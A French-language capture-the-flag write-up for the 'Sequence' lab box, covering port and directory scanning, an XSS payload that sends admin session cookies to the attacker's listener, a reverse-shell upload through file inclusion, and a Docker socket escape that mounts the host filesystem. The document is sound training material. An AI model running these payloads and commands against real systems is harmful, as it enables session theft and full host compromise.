---
title: Sequence
weight: 1
---


<center>
    <img src="../img/sequence_logo.png" width="20%" />
</center>


# Sequence

La box sequence consiste en l'enchainement de plusieurs vulnérabilités web pour prendre le contrôle total d'une machine.

## Port Enum

Nous allons commencer simplement par une énumération des ports de la machine :

```bash
nmap -sS -sV -p- -T5 review.thm -oN scan.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-19 18:13 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for review.thm (10.81.177.118)
Host is up (0.0046s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Nous avons donc une application web et un service SSH : concentrons nous sur l'application web.

### Compromission du modérateur

Nous avons le choix entre un formulaire de contact et un formulaire de connexion, nous allons commencer par essayer de voir s'il est possible de voluer le cookie d'un modérateur ou d'un adminsitrateur :

```bash
<script>document.location='http://10.81.76.213:8888/XSS/grabber.php?c='+document.cookie</script>
```

après quelques secondes on a : 

```
root@ip-10-81-76-213:~/workspace# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.81.76.213 - - [19/Jan/2026 18:50:42] "GET /?c=PHPSESSID=oksnp5a62vr82oh5qnbq8dl9r1 HTTP/1.1" 404 -
```

### Compromission de l'administrateur

On accès alors à plusieurs pages, dont un chat. On observe également que si on clique sur "View Feedback", notre payload xss est exécuté. Nous allons donc envoyer le lien de review à l'admin via le chat : 


![pwn admin](../img/sequence_trapAdmin.png)
```bash
root@ip-10-81-76-213:~/workspace# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.81.177.118 - - [19/Jan/2026 18:54:53] code 404, message File not found
10.81.177.118 - - [19/Jan/2026 18:54:53] "GET /XSS/grabber.php?c=PHPSESSID=u48jkin84aeoo85ql0o9dk9ihc HTTP/1.1" 404 -
```

On récupère alors le deuxième flag.

## Reverse Shell

Après cela, on tombe sur un dashboard mais qui n'a pas l'air d'avoir beaucoup de faille et nous allons donc repasser dans une phase d'énumération avec gobuster et nikto : 
```bash
gobuster dir -u http://review.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://review.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 1694]
/contact.php          (Status: 200) [Size: 2246]
/login.php            (Status: 200) [Size: 1944]
/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
/header.php           (Status: 200) [Size: 1400]
/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/db.php               (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/settings.php         (Status: 302) [Size: 0] [--> login.php]
/dashboard.php        (Status: 302) [Size: 1400] [--> login.php]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
/.php                 (Status: 403) [Size: 275]
Progress: 175328 / 175330 (100.00%)
===============================================================
Finished
===============================================================

```

```bash
nikto -h review.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.81.177.118
+ Target Hostname:    review.thm
+ Target Port:        80
+ Start Time:         2026-01-19 19:48:28 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ Cookie phpMyAdmin created without the httponly flag
+ Cookie goto created without the httponly flag
+ Cookie back created without the httponly flag
+ Cookie pma_lang created without the httponly flag
+ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ /login.php: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 6544 items checked: 0 error(s) and 22 item(s) reported on remote host
+ End Time:           2026-01-19 19:48:41 (GMT0) (13 seconds)
---------------------------------------------------------------------------
```

Dans le dossier mail on trouve une note : 

```bash
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert

```

Donc on a le mot de passe de l’interface /finance.php et on va tenter d'y accéder en modifiant le comportement de dashboard.php avec Caido.

### Panneau Finance

![Interface Finance](../img/sequence_finance.png)

### Uploading reverse shell

Il n'y a pas de protection sur l'upload, nous allons donc uploader un reverse-shell via le formulaire de finance.php, puis l’exécuter grâce à l’inclusion dans dashboard.php

![execution du reverse-shell](../img/sequence_revshell.png)

## Escape the container

On observe plusieurs choses dans ce terminal : 

- le hostname est un hash
- il y a un fichier .dockerenv à la racine
- Nous sommes `root`

nous sommes donc dans un container.  et on observe que nous avons accès à la commande docker et au docker daemon : 

```bash
# docker ps 
CONTAINER ID   IMAGE           COMMAND                  CREATED        STATUS       PORTS     NAMES
4f18a45cca05   phpvulnerable   "docker-php-entrypoi\u2026"   7 months ago   Up 2 hours   80/tcp    phpVulnerable

# docker images
docker images
REPOSITORY      TAG       IMAGE ID       CREATED         SIZE
phpvulnerable   latest    d0bf58293d3b   7 months ago    926MB
php             8.1-cli   0ead645a9bc2   10 months ago   527MB

```

Nous allons donc créer un nouveau container avec une des images disponibles et cette fois en montant la racine du host dans le dossier mount : `-v /:/mnt`. Une fois cette 

```bash
root@4f18a45cca05:/# docker run -v /:/mnt -d d0bf58293d3b tail -f /dev/null
docker run -v /:/mnt -d d0bf58293d3b tail -f /dev/null
ae4760cc17fbacd0f1a6758c9b34d9d8b7633c87ddbb88b97bf38413fbacdcc1

```

Une fois le container créé, on a accès au système de fichier de l’hôte : 

```bash

root@4f18a45cca05:/# docker ps 
docker ps 
CONTAINER ID   IMAGE           COMMAND                  CREATED         STATUS         PORTS     NAMES
ae4760cc17fb   d0bf58293d3b    "docker-php-entrypoi\u2026"   3 seconds ago   Up 2 seconds   80/tcp    zealous_swartz
4f18a45cca05   phpvulnerable   "docker-php-entrypoi\u2026"   7 months ago    Up 3 hours     80/tcp    phpVulnerable
root@4f18a45cca05:/# docker exec ae4760cc17fb ls /mnt/root
docker exec ae4760cc17fb ls /mnt/root
bin
flag.txt
lib
root
share
snap
~
root@4f18a45cca05:/# docker exec ae4760cc17fb cat /mnt/root/flag.txt
docker exec ae4760cc17fb cat /mnt/root/flag.txt
THM{xxxxxxxxxxxxxx}

```